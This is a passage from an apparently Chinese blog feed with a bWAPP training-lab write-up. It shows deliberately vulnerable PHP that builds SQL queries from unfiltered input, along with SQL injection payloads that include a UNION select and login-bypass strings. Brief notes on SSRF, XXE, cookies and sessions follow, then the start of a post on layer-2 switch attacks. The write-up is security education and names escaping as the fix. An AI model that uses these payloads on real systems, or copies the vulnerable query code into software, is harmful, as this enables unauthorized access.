class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Retrieves the movie title</span></span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Constructs the query</span></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Queries the database</span></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fetches the result</span></span><br><span class="line">    <span class="keyword">if</span>(mysql_num_rows($recordset) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($recordset))</span><br><span class="line">        &#123;</span><br><span class="line">            $movies[] = $row;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $movies = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $movies = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: text/json; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Encodes the result to JSON</span></span><br><span class="line"><span class="keyword">echo</span> json_encode($movies);</span><br></pre></td></tr></table></figure><p>这里是使用 Ajax 异步提交数据的方式，如果直接修改 URL 或者刷新页面是不会返回数据的</p><p>但是用 burp 抓包之后修改 title 就可以注入。这里注入的原理也是输入未过滤导致可以构造 sql 语句。</p><h2 id="利用方式-13"><a href="#利用方式-13" class="headerlink" title="利用方式"></a>利用方式</h2><p>抓包修改 title，构造 sql 语句，查看返回的 json 数据</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_8.png" alt></p><h2 id="防护方式-13"><a href="#防护方式-13" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p><h1 id="SQL-Injection-CAPTCHA"><a href="#SQL-Injection-CAPTCHA" class="headerlink" title="SQL Injection (CAPTCHA)"></a>SQL Injection (CAPTCHA)</h1><h2 id="产生原因-14"><a href="#产生原因-14" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"title"</span>])) </span><br><span class="line">&#123;   </span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原理和前面的类似，只是在前面加了一个验证码的页面，防止工具注入，可以用脚本识别</p><h2 id="利用方式-14"><a href="#利用方式-14" class="headerlink" title="利用方式"></a>利用方式</h2><p>输入验证码之后进行注入</p><p>payload : </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%&apos; union select 1,2,3,4,5,6,7 #</span><br></pre></td></tr></table></figure><h2 id="防护方式-14"><a href="#防护方式-14" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p><h1 id="SQL-Injection-Login-Form-Hero"><a href="#SQL-Injection-Login-Form-Hero" class="headerlink" title="SQL Injection (Login Form/Hero)"></a>SQL Injection (Login Form/Hero)</h1><h2 id="产生原因-15"><a href="#产生原因-15" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$message=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $login = $_POST[<span class="string">"login"</span>];</span><br><span class="line">    $login = sqli($login);</span><br><span class="line">    $password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">    $password = sqli($password);</span><br><span class="line">    </span><br><span class="line">    $sql = <span class="string">"SELECT * FROM heroes WHERE login = '"</span> . $login . <span class="string">"' AND password = '"</span> . $password . <span class="string">"'"</span>;</span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Error: "</span> . mysql_error());</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $row = mysql_fetch_array($recordset);</span><br><span class="line">        <span class="keyword">if</span>($row[<span class="string">"login"</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            $message =  <span class="string">"&lt;p&gt;Welcome &lt;b&gt;"</span> . ucwords($row[<span class="string">"login"</span>]) . <span class="string">"&lt;/b&gt;, how are you today?&lt;/p&gt;&lt;p&gt;Your secret: &lt;b&gt;"</span> . ucwords($row[<span class="string">"secret"</span>]) . <span class="string">"&lt;/b&gt;&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            message = <span class="string">"&lt;font color=\"red\"&gt;Invalid credentials!&lt;/font&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在表格中提交数据，且数据未过滤。</p><p>如果 login 输入 <code>1&#39; or 1=1 or &#39;1</code>，password 输入任意密码，那么查询语句变为 <code>SELECT * FROM heroes WHERE login = &#39;1&#39; or 1=1 or &#39;1&#39; AND password = &#39;xxxx&#39;</code>，由于 sql 语句的逻辑运算，这个语句恒真，即无论输入什么密码，都能登陆，又叫万能密码</p><h2 id="利用方式-15"><a href="#利用方式-15" class="headerlink" title="利用方式"></a>利用方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login : <span class="number">1</span><span class="string">' or 1=1 or '</span><span class="number">1</span></span><br><span class="line">password : 随意</span><br></pre></td></tr></table></figure><h2 id="防护方式-15"><a href="#防护方式-15" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p><h1 id="SQL-Injection-Login-Form-User"><a href="#SQL-Injection-Login-Form-User" class="headerlink" title="SQL Injection (Login Form/User)"></a>SQL Injection (Login Form/User)</h1><h2 id="产生原因-16"><a href="#产生原因-16" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$message=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$login = $_POST[<span class="string">"login"</span>];</span><br><span class="line">$login = sqli($login);</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">$password = sqli($password);</span><br><span class="line">$password = hash(<span class="string">"sha1"</span>, $password, <span class="keyword">false</span>);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE login = '"</span> . $login . <span class="string">"'"</span>;</span><br><span class="line">$recordset = mysql_query($sql, $link);</span><br><span class="line"><span class="keyword">if</span>(!$recordset)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Error: "</span> . mysql_error());</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$row = mysql_fetch_array($recordset);</span><br><span class="line"><span class="keyword">if</span>($row[<span class="string">"login"</span>] &amp;&amp; $password == $row[<span class="string">"password"</span>])</span><br><span class="line">&#123;</span><br><span class="line">$message =  <span class="string">"&lt;p&gt;Welcome &lt;b&gt;"</span> . ucwords($row[<span class="string">"login"</span>]) . <span class="string">"&lt;/b&gt;, how are you today?&lt;/p&gt;&lt;p&gt;Your secret: &lt;b&gt;"</span> . ucwords($row[<span class="string">"secret"</span>]) . <span class="string">"&lt;/b&gt;&lt;/p&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$message = <span class="string">"&lt;font color=\"red\"&gt;Invalid credentials!&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close($link);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原理和前面类似，也是没有过滤输入，这样就可以构造 sql 语句</p><p>这里代码逻辑就是先查询 login 再用查询的结果判断有没有和 password 的 sha1 相同的账号</p><h2 id="利用方式-16"><a href="#利用方式-16" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login : <span class="number">-1</span><span class="string">' union select 1,2,"356a192b7913b04c54574d18c28d46e6395428ab",4,5,6,7,8,9#</span></span><br><span class="line"><span class="string">password : 1</span></span><br></pre></td></tr></table></figure><p>查询语句变为 <code>SELECT * FROM users WHERE login = &#39;-1&#39; union select 1,2,&quot;356a192b7913b04c54574d18c28d46e6395428ab&quot;,4,5,6,7,8,9#</code>，这样查询结果就会多一个 union，依靠经验 1 对应 id，2 对应 username，3 对应 password，所以在 3 的位置填入密码的 sha1 值，这样就能构造出来用户为 2，密码为 1 的用户了</p><h2 id="防护方式-16"><a href="#防护方式-16" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p><h1 id="SQL-Injection-SQLite"><a href="#SQL-Injection-SQLite" class="headerlink" title="SQL Injection (SQLite)"></a>SQL Injection (SQLite)</h1><h2 id="产生原因-17"><a href="#产生原因-17" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-17"><a href="#利用方式-17" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-17"><a href="#防护方式-17" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Drupal"><a href="#SQL-Injection-Drupal" class="headerlink" title="SQL Injection (Drupal)"></a>SQL Injection (Drupal)</h1><h2 id="产生原因-18"><a href="#产生原因-18" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-18"><a href="#利用方式-18" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-18"><a href="#防护方式-18" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-Blog"><a href="#SQL-Injection-Stored-Blog" class="headerlink" title="SQL Injection - Stored (Blog)"></a>SQL Injection - Stored (Blog)</h1><h2 id="产生原因-19"><a href="#产生原因-19" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-19"><a href="#利用方式-19" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-19"><a href="#防护方式-19" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-SQLite"><a href="#SQL-Injection-Stored-SQLite" class="headerlink" title="SQL Injection - Stored (SQLite)"></a>SQL Injection - Stored (SQLite)</h1><h2 id="产生原因-20"><a href="#产生原因-20" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-20"><a href="#利用方式-20" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-20"><a href="#防护方式-20" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-User-Agent"><a href="#SQL-Injection-Stored-User-Agent" class="headerlink" title="SQL Injection - Stored (User-Agent)"></a>SQL Injection - Stored (User-Agent)</h1><h2 id="产生原因-21"><a href="#产生原因-21" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-21"><a href="#利用方式-21" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-21"><a href="#防护方式-21" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-XML"><a href="#SQL-Injection-Stored-XML" class="headerlink" title="SQL Injection - Stored (XML)"></a>SQL Injection - Stored (XML)</h1><h2 id="产生原因-22"><a href="#产生原因-22" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-22"><a href="#利用方式-22" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-22"><a href="#防护方式-22" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Boolean-Based"><a href="#SQL-Injection-Blind-Boolean-Based" class="headerlink" title="SQL Injection - Blind - Boolean-Based"></a>SQL Injection - Blind - Boolean-Based</h1><h2 id="产生原因-23"><a href="#产生原因-23" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-23"><a href="#利用方式-23" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-23"><a href="#防护方式-23" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Time-Based"><a href="#SQL-Injection-Blind-Time-Based" class="headerlink" title="SQL Injection - Blind - Time-Based"></a>SQL Injection - Blind - Time-Based</h1><h2 id="产生原因-24"><a href="#产生原因-24" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-24"><a href="#利用方式-24" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-24"><a href="#防护方式-24" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-SQLite"><a href="#SQL-Injection-Blind-SQLite" class="headerlink" title="SQL Injection - Blind (SQLite)"></a>SQL Injection - Blind (SQLite)</h1><h2 id="产生原因-25"><a href="#产生原因-25" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-25"><a href="#利用方式-25" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-25"><a href="#防护方式-25" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Web-Services-SOAP"><a href="#SQL-Injection-Blind-Web-Services-SOAP" class="headerlink" title="SQL Injection - Blind (Web Services/SOAP)"></a>SQL Injection - Blind (Web Services/SOAP)</h1><h2 id="产生原因-26"><a href="#产生原因-26" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-26"><a href="#利用方式-26" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-26"><a href="#防护方式-26" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XML-XPath-Injection-Login-Form"><a href="#XML-XPath-Injection-Login-Form" class="headerlink" title="XML/XPath Injection (Login Form)"></a>XML/XPath Injection (Login Form)</h1><h2 id="产生原因-27"><a href="#产生原因-27" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-27"><a href="#利用方式-27" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-27"><a href="#防护方式-27" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XML-XPath-Injection-Search"><a href="#XML-XPath-Injection-Search" class="headerlink" title="XML/XPath Injection (Search)"></a>XML/XPath Injection (Search)</h1><h2 id="产生原因-28"><a href="#产生原因-28" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-28"><a href="#利用方式-28" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-28"><a href="#防护方式-28" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XML 外部实体注入</p><p>以 XML 形式发送数据</p><p>实现 ssrf</p><p>读文件</p><p>执行命令</p><p>扫描端口</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF 简介"></a>SSRF 简介</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul><li><p>服务端请求伪造，利用漏洞伪造服务器发送请求，从而获取内网数据</p></li><li><p>一般情况下，SSRF 的目标就是与外部隔离的内网资源。</p></li></ul><h3 id="SSRF-原理"><a href="#SSRF-原理" class="headerlink" title="SSRF 原理"></a>SSRF 原理</h3><p>服务端提供了从内网获取数据的功能，但没有对请求目标地址做过滤</p><h3 id="SSRF-用途"><a href="#SSRF-用途" class="headerlink" title="SSRF 用途"></a>SSRF 用途</h3><ul><li>内外网的端口和服务扫描，获取 Banner 信息</li><li>服务器本地敏感数据的读取</li><li>内外网主机应用程序漏洞的利用</li><li>内外网Web站点漏洞的利用 </li><li>……</li></ul><p>产生 SSRF 的 PHP 函数</p><p>file_get_content</p><p>fsockopen()</p><p>curl_exec()</p><h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在传统的 Web 应用程序的工作方式下，客户端和浏览器之间的通信时同步的。比如，当用户在 Web 页面上填写好的表单，提交请求后就会发送到远程服务器上，经过处理之后，服务器再将处理的结果返回，这种行为反复执行，极大的浪费了网络带宽。</p><p>Ajax是由 JavaScript 与 CSS、XML、DOM 几种老技术加上 XMLHttpRequest 构成。使用 Ajax 技术后，客户端可以只向服务器传输更新过的内容，借助于客户端的 JavaScript 处理来自服务器的响应。比如，当用户在单击表单按钮时，会使用 JavaScript 和 DHTML 立即更新页面，并向服务器发送异步请求，以执行更新或查询数据库。当请求返回时，就可以只使用 JavaScript 和 CSS 来相应的更新页面，因为客户端和服务端只交互有用的数据，页面显示等不必要的数据便不再重新加载。</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li>搜索引擎能依照用户输入的关键词，自动列出最多人找到的关键词查询</li><li>注册模块中，用户填写完用户名后，系统会实时验证该用户名是否被注册</li></ul><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="Cookie-简介"><a href="#Cookie-简介" class="headerlink" title="Cookie 简介"></a>Cookie 简介</h2><p>Cookie 是一种让网站服务器能把少量文本数据存到客户端硬盘、内存，或者是从客户端的硬盘、内存读取数据的一种技术。</p><p>因为 HTTP 协议是无状态的，Web 服务器无法区分一个请求是否来自同一个浏览器。所以，Web 服务器需要额外的数据用于维护会话。Cookie 正式一段随 HTTP 请求、响应一起被传递的额外数据，它的作用就是<strong>标识用户、维持会话</strong>。</p><p>当你访问某个网站时，该网站可能向你的电脑写入一个非常小的文本文件，他可以记录你用户的 ID、密码、停留的时间等信息，这个文件就是 Cookie 文件。当你再次访问这个网站时，浏览器会自动检测你的硬盘，并将存储在本地的 Cookie 发送给网站，网站通过读取 Cookie，得到你的相关信息，就可以做出相应的动作。</p><p>Cookie 按照在硬盘中存储的位置，可以分为<strong>内存 Cookie</strong> 和 <strong>硬盘 Cookie</strong>。内存 Cookie 由浏览器维护，保存在内存中，浏览器关闭后就消失，其存在时间是短暂的。硬盘 Cookie 保存在硬盘中，有一个过期时间，除非用户手动清理，或者到了过期时间，否则硬盘 Cookie 是不会被删除的，其存在时间是长期的。所以，Cookie 也可以分为<strong>持久 Cookie</strong> 和<strong>非持久 Cookie</strong>。</p><p>一个用户电脑里也可以有多个 Cookie 存在，分别保存不同网站的存储信息，但是一个网站只能存取自己的 Cookie 信息，无法读取电脑上的其他 Cookie 信息。</p><h2 id="Cookie-格式"><a href="#Cookie-格式" class="headerlink" title="Cookie 格式"></a>Cookie 格式</h2><p>每个 Cookie 文件都是一个 TXT 文件，都以 “<strong>用户名@网站 URL</strong>“ 来命名。</p><p>Cookie 部分格式如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: <span class="tag">&lt;<span class="name">name</span>&gt;</span>=<span class="tag">&lt;<span class="name">value</span>&gt;</span>[;<span class="tag">&lt;<span class="name">Max-Age</span>&gt;</span>=<span class="tag">&lt;<span class="name">age</span>&gt;</span>][;expires=<span class="tag">&lt;<span class="name">date</span>&gt;</span>][;domain=<span class="tag">&lt;<span class="name">domain_name</span>&gt;</span>][;path=<span class="tag">&lt;<span class="name">some_path</span>&gt;</span>][;secure][;HttpOnly]</span><br></pre></td></tr></table></figure><ul><li>Set-Cookie : HTTP 响应头，Web 服务器通过此 HTTP 头向客户端发送 Cookie</li><li>name=value : 每一个 Cookie 必须含有的部分。用户可以根据 name 取出存在 Cookie 中的 value。name=value 中不含有分号、逗号、空格。</li><li>expirse=date : Expires 确定了 Cookie 的有效终止日期。该变量是可选的，如果缺省，则 Cookie 的值不会保存在硬盘中，而仅仅保存在内存中。</li><li>domain=domain_name : Domain 变量确定了哪些 Internet 域中的服务器可以读取浏览器的存储的 Cookie。该设置是可选的，如果缺省，值为该 Web 服务器的域名。</li><li>path=path : 定义了 Web 服务器上哪些路径下的页面可以获取服务器发送的 Cookie。该设置是可选的，如果缺省，值为该 Web 服务器传给浏览器的资源路径名。</li><li>secure : 如果在 Cookie 中标记该变量，表明和服务器之间的通信协议为加密认证协议时，才会发送 Cookie，目前只有 HTTPS。</li><li>HttpOnly : 禁止 Javascript 读取 Cookie。</li></ul><h1 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h1><p>除了 Cookie 之外，SESSION 是另外一种维持会话访问状态的机制。只不过 SESSION 是服务端的机制，SESSION 与 Cookie 的区别就是，SESSION 保存在服务端，Cookie 保存在客户端。</p><p>Web 中的 SESSION 是指从打开一个网站到关闭浏览器的过程，也就是客户端与服务端一次”对话”，被称为 SESSION，当浏览器关闭时，SESSION 也自动注销。</p><p>每个用户的会话状态都是不同的 SESSION，管理员登陆网站时，这是一个 SESSION，普通用户登陆网站时，这又是一个 SESSION。而服务器依靠 SESSIONID 来区分不同的 SESSION。</p><p>当用户第一次连接到服务器时，会分配一个 SESSIONID，这个 SESSIONID 是唯一的，且不会重复，当服务器或浏览器关闭时，SESSION 将自动注销，用户重新连接时会重新分配。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;基于 bWAPP，所列举的 payload 只是典型例子&lt;/p&gt;
&lt;h1 id=&quot;HTML-Injection-Reflected-GET&quot;&gt;&lt;a href=&quot;#HTML-Injection-Reflected-GET&quot; class=&quot;headerlink&quot; title=&quot;
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>二层交换中的攻击</title>
    <link href="http://yoursite.com/2019/06/13/%E4%BA%8C%E5%B1%82%E4%BA%A4%E6%8D%A2%E4%B8%AD%E7%9A%84%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2019/06/13/二层交换中的攻击/</id>
    <published>2019-06-12T16:23:24.176Z</published>
    <updated>2019-06-14T07:20:12.443Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前导篇"><a href="#前导篇" class="headerlink" title="前导篇"></a>前导篇</h1><h2 id="以太网和以太网帧"><a href="#以太网和以太网帧" class="headerlink" title="以太网和以太网帧"></a>以太网和以太网帧</h2><h3 id="OSI-模型"><a href="#OSI-模型" class="headerlink" title="OSI 模型"></a>OSI 模型</h3><ul><li>其核心思想为<strong>分层</strong>，每一个模块只负责自己特定的功能</li><li>不同模块之间定义标准化接口，实现每层的相互独立</li><li>下层将收到的数据格式化成上层所能识别的格式，同时也能通过变换，将数据传给下层</li></ul><h3 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h3><ul><li>在局域网中应用最广泛的网络技术</li><li>使用 CSMA/CD 解决冲突问题</li></ul><h3 id="以太网帧"><a href="#以太网帧" class="headerlink" title="以太网帧"></a>以太网帧</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/6.png" alt></p><ul><li>前导码(7 字节)：唤醒接收适配器(例如网卡)，并将他们的时钟与发送方同步</li><li>帧首定界符(1 字节)：注明下一字节为目的 MAC 地址</li><li>目的 MAC 地址(6 字节)：目的适配器的 MAC 地址</li><li>源 MAC 地址(6 字节)：发送方目的地址</li><li>协议类型(2 字节：实现协议的多路复用，用于标识协议类型，例如 IP 协议 (0x0800)，ARP 协议 (0x0808)，更多协议 <a href="https://www.cnblogs.com/code1992/p/9829198.html" target="_blank" rel="noopener">点击此处</a></li><li>数据：承载 IP 数据报</li><li>数据帧检验序列(4 字节)：差错检测机制</li></ul><h2 id="二层交换机转发原理"><a href="#二层交换机转发原理" class="headerlink" title="二层交换机转发原理"></a>二层交换机转发原理</h2><h3 id="转发原理"><a href="#转发原理" class="headerlink" title="转发原理"></a>转发原理</h3><ul><li>交换机接收到数据帧之后将它们转发出去，这个过程可以分为过滤和转发两个部分。</li><li>过滤功能就是交换机判断一个数据帧应转发到某个端口还是丢弃。</li><li>转发功能就是交换机进行帧过滤后，决定一个数据帧应该到哪一个交换机端口。</li><li>交换机按照数据帧中的目的 MAC 地址作为索引，通过对交换机内部的 CAM 表进行查询来实现转发。</li></ul><h3 id="CAM-表"><a href="#CAM-表" class="headerlink" title="CAM 表"></a>CAM 表</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/35.png" alt></p><ul><li>交换机通过对收到的数据帧中的源 MAC 地址进行学习构造 CAM 表</li><li>转发与自学习算法<ol><li>交换机从端口接收数据帧，暂存到缓存中</li><li>自学习：截取数据帧中的源 MAC 地址，与 CAM 表中的 MAC 地址匹配<ul><li>找到匹配地址，对应端口号相同，更新时间戳</li><li>找到匹配地址，对应端口号不同，更改对应端口号并更新时间戳</li><li>未找到匹配地址，将数据帧中的源 MAC 地址，来自交换机的端口，以及时间戳添加到 CAM 表中</li><li>如果某个 MAC 